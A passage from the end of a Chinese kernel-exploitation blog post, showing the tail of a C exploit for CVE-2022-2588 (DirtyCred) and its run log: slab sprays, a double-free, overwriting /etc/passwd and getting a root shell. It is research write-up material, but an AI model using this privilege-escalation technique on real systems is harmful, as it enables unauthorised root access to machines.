<span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./exploit</span></span><br><span class="line">[*] self path /home/hi/./exploit</span><br><span class="line">[*] prepare evil data</span><br><span class="line">Old limits -&gt; soft limit= 14096 	 hard limit= 14096 </span><br><span class="line">[*] starting exploit, num of cores: 4</span><br><span class="line">[1] defragmentation - spray 10000 `file` to exhaust all file slabs for cross cache</span><br><span class="line">[2] spray (38+3)*32 kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[3] allocate the vulnerable filter</span><br><span class="line">[4] spray kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[5] free (end-24)*32 kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[6] 1st freed the filter object</span><br><span class="line">[7] free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[8] spray 4000 uprivileged `file`</span><br><span class="line">[9] 2nd free the filter object</span><br><span class="line">pause after 2nd free</span><br><span class="line">[10] spraying 5000 unprivileged `file`</span><br><span class="line">[10-1] found overlapped file, id : 22, 1930</span><br><span class="line">[11] start 2 threads compete to write</span><br><span class="line">[11-1] start slow write</span><br><span class="line">[11-2] write evil data after the slow write</span><br><span class="line">[12] got cmd, start spraying 4096*2 `file` by opening /etc/passwd</span><br><span class="line">[*] spray done</span><br><span class="line">[*] write done, spent 9.352879 s</span><br><span class="line">[13] check whether we overwrite the privileged file</span><br><span class="line">[+] succeed</span><br><span class="line"><span class="meta">$</span><span class="bash"> su hi</span></span><br><span class="line">Password: </span><br><span class="line"><span class="meta">#</span><span class="bash"> id</span></span><br><span class="line">uid=0(hi) gid=0(root) groups=0(root)</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/passwd</span></span><br><span class="line">hi:x:0:0:root:/:/bin/sh</span><br><span class="line">root::0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/575931271">CVE-2022-2588 Double-free 漏洞 DirtyCred 利用</a> </p>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/Kernel/" rel="tag"><i class="fa fa-tag"></i> Kernel</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/12/19/RCTF2022/" rel="prev" title="RCTF2022">
      <i class="fa fa-chevron-left"></i> RCTF2022
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/01/06/CATCTF2022/" rel="next" title="CATCTF2022">
      CATCTF2022 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">277</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">145</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">3.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">58:25</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
